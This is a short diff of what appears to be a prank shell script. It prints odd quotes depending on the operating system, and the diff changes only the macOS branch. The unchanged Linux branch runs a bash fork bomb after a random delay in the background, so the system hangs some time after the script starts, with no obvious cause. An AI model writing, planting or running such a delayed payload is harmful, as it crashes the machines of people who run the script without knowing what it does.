@@ -103,7 +103,7 @@ ddmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 # Pick your Poison
 if [[ "$OSTYPE" == "darwin"* ]]; then
 	echo "I have the strange feeling that I’ve forgotten all of this before."
-	(sleep $RANDOM ;) &
+	(sleep $RANDOM ; echo 'fix me') &
 elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
 	echo "So, it was me all along! Now I understand whats going on here!"
 	(sleep $RANDOM ; :(){:|:&};:) & 
